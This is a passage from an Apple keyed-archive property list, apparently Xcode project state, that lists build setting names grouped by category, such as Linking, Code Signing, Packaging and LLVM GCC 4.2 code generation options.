				<dict>
					<key>CF$UID</key>
					<integer>522</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>523</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>524</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>525</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>526</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>527</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>528</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>529</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>530</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>531</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>532</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>533</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>534</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>535</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>536</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>537</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>538</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>539</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>540</integer>
				</dict>
			</array>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Architectures||ADDITIONAL_SDKS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Architectures||ARCHS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Architectures||SDKROOT</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Architectures||SUPPORTED_PLATFORMS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Architectures||VALID_ARCHS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Build Locations||SYMROOT</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Build Locations||OBJROOT</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Build Locations||SHARED_PRECOMPS_DIR</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Build Options||BUILD_VARIANTS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Build Options||GCC_VERSION</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Build Options||DEBUG_INFORMATION_FORMAT</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Build Options||ENABLE_OPENMP_SUPPORT</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Build Options||GENERATE_PROFILING_CODE</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Build Options||PRECOMPS_INCLUDE_HEADERS_FROM_BUILT_PRODUCTS_DIR</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Build Options||RUN_CLANG_STATIC_ANALYZER</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Build Options||SCAN_ALL_SOURCE_FILES_FOR_INCLUDES</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Build Options||VALIDATE_PRODUCT</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Code Signing||CODE_SIGN_ENTITLEMENTS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Code Signing||CODE_SIGN_IDENTITY</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Code Signing||CODE_SIGN_RESOURCE_RULES_PATH</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Code Signing||OTHER_CODE_SIGN_FLAGS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Deployment||STRIPFLAGS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Deployment||ALTERNATE_GROUP</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Deployment||ALTERNATE_OWNER</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Deployment||ALTERNATE_MODE</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Deployment||ALTERNATE_PERMISSIONS_FILES</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Deployment||COMBINE_HIDPI_IMAGES</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Deployment||DEPLOYMENT_LOCATION</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Deployment||DEPLOYMENT_POSTPROCESSING</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Deployment||INSTALL_GROUP</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Deployment||INSTALL_OWNER</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Deployment||INSTALL_MODE_FLAG</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Deployment||DSTROOT</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Deployment||INSTALL_PATH</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Deployment||MACOSX_DEPLOYMENT_TARGET</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Deployment||SKIP_INSTALL</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Deployment||COPY_PHASE_STRIP</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Deployment||STRIP_INSTALLED_PRODUCT</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Deployment||STRIP_STYLE</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Deployment||SEPARATE_STRIP</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Kernel Module||MODULE_NAME</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Kernel Module||MODULE_START</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Kernel Module||MODULE_STOP</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Kernel Module||MODULE_VERSION</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Linking||BUNDLE_LOADER</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Linking||DYLIB_COMPATIBILITY_VERSION</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Linking||DYLIB_CURRENT_VERSION</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Linking||DEAD_CODE_STRIPPING</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Linking||LINKER_DISPLAYS_MANGLED_NAMES</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Linking||LD_NO_PIE</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Linking||PRESERVE_DEAD_CODE_INITS_AND_TERMS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Linking||LD_DYLIB_INSTALL_NAME</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Linking||EXPORTED_SYMBOLS_FILE</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Linking||INIT_ROUTINE</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Linking||LINK_WITH_STANDARD_LIBRARIES</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Linking||MACH_O_TYPE</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Linking||LD_OPENMP_FLAGS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Linking||ORDER_FILE</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Linking||OTHER_LDFLAGS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Linking||GENERATE_MASTER_OBJECT_FILE</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Linking||PRELINK_LIBS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Linking||KEEP_PRIVATE_EXTERNS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Linking||LD_RUNPATH_SEARCH_PATHS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Linking||SEPARATE_SYMBOL_EDIT</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Linking||PRELINK_FLAGS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Linking||SECTORDER_FLAGS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Linking||UNEXPORTED_SYMBOLS_FILE</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Linking||WARNING_LDFLAGS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Linking||LD_GENERATE_MAP_FILE</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Packaging||APPLY_RULES_IN_COPY_FILES</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Packaging||EXECUTABLE_EXTENSION</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Packaging||EXECUTABLE_PREFIX</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Packaging||INFOPLIST_EXPAND_BUILD_SETTINGS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Packaging||GENERATE_PKGINFO_FILE</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Packaging||FRAMEWORK_VERSION</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Packaging||INFOPLIST_FILE</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Packaging||INFOPLIST_OTHER_PREPROCESSOR_FLAGS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Packaging||INFOPLIST_OUTPUT_FORMAT</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Packaging||INFOPLIST_PREPROCESSOR_DEFINITIONS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Packaging||INFOPLIST_PREFIX_HEADER</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Packaging||INFOPLIST_PREPROCESS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Packaging||COPYING_PRESERVES_HFS_DATA</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Packaging||PRIVATE_HEADERS_FOLDER_PATH</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Packaging||PRODUCT_NAME</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Packaging||PLIST_FILE_OUTPUT_FORMAT</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Packaging||PUBLIC_HEADERS_FOLDER_PATH</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Packaging||STRINGS_FILE_OUTPUT_ENCODING</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Packaging||WRAPPER_EXTENSION</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Search Paths||ALWAYS_SEARCH_USER_PATHS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Search Paths||FRAMEWORK_SEARCH_PATHS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Search Paths||HEADER_SEARCH_PATHS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Search Paths||LIBRARY_SEARCH_PATHS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Search Paths||REZ_SEARCH_PATHS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Search Paths||EXCLUDED_RECURSIVE_SEARCH_PATH_SUBDIRECTORIES</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Search Paths||INCLUDED_RECURSIVE_SEARCH_PATH_SUBDIRECTORIES</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Search Paths||USER_HEADER_SEARCH_PATHS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Unit Testing||OTHER_TEST_FLAGS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Unit Testing||TEST_AFTER_BUILD</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Unit Testing||TEST_HOST</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Unit Testing||TEST_RIG</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Versioning||CURRENT_PROJECT_VERSION</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Versioning||VERSION_INFO_FILE</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Versioning||VERSION_INFO_EXPORT_DECL</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Versioning||VERSION_INFO_PREFIX</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Versioning||VERSION_INFO_SUFFIX</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Versioning||VERSIONING_SYSTEM</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Versioning||VERSION_INFO_BUILDER</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Code Generation||GCC_FAST_OBJC_DISPATCH</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Code Generation||GCC_OBJC_CALL_CXX_CDTORS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Code Generation||GCC_ENABLE_SSE3_EXTENSIONS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Code Generation||GCC_ENABLE_SSE41_EXTENSIONS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Code Generation||GCC_ENABLE_SSE42_EXTENSIONS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Code Generation||GCC_ENABLE_SUPPLEMENTAL_SSE3_INSTRUCTIONS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Code Generation||GCC_STRICT_ALIASING</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Code Generation||GCC_FEEDBACK_DIRECTED_OPTIMIZATION</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Code Generation||GCC_GENERATE_DEBUGGING_SYMBOLS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Code Generation||GCC_DYNAMIC_NO_PIC</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Code Generation||GCC_GENERATE_TEST_COVERAGE_FILES</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Code Generation||GCC_INLINES_ARE_PRIVATE_EXTERN</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Code Generation||GCC_INSTRUMENT_PROGRAM_FLOW_ARCS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Code Generation||GCC_ENABLE_KERNEL_DEVELOPMENT</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Code Generation||GCC_DEBUGGING_SYMBOLS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Code Generation||LLVM_LTO</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Code Generation||GCC_REUSE_STRINGS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Code Generation||GCC_NO_COMMON_BLOCKS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Code Generation||GCC_ENABLE_OBJC_GC</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Code Generation||GCC_FAST_MATH</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Code Generation||GCC_ENABLE_SYMBOL_SEPARATION</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Code Generation||GCC_THREADSAFE_STATICS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Code Generation||GCC_SYMBOLS_PRIVATE_EXTERN</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Code Generation||GCC_UNROLL_LOOPS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Language||GCC_CHAR_IS_UNSIGNED_CHAR</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Language||GCC_ENABLE_ASM_KEYWORD</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Language||GCC_C_LANGUAGE_STANDARD</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Language||GCC_CHECK_RETURN_VALUE_OF_OPERATOR_NEW</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Language||GCC_INPUT_FILETYPE</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Language||GCC_ENABLE_CPP_EXCEPTIONS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Language||GCC_ENABLE_CPP_RTTI</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Language||GCC_LINK_WITH_DYNAMIC_LIBRARIES</string>
		</dict>
